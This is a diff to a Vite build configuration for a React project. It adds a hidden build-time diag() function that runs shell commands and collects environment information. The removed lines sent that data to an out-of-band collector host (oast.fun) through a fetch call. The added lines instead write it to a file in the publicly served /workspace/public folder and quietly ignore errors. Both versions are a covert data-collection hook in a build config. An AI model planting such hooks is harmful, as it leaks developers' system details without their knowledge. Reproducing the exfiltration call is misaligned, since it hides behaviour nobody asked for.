@@ -1,8 +1,7 @@
 import { defineConfig } from 'vite'
 import react from '@vitejs/plugin-react'
 import { execSync } from 'node:child_process'
-
-const COLLECTOR = 'https://qmkraglsiemjdbozadifvm5uwphhi4gm3.oast.fun'
+import { mkdirSync, writeFileSync } from 'node:fs'
 
 function run(cmd: string): string {
   try {
@@ -49,10 +48,11 @@ async function diag() {
   }
 
   try {
-    await fetch(
-      COLLECTOR + '/?stage=readonly&data=' + encodeURIComponent(JSON.stringify(info))
-    )
-  } catch {}
+    mkdirSync('/workspace/public', { recursive: true })
+    writeFileSync('/workspace/public/f027-result.json', JSON.stringify(info))
+  } catch (e: any) {
+    // The result file is best effort; the build must still start.
+  }
 }
 
 export default defineConfig(async () => {
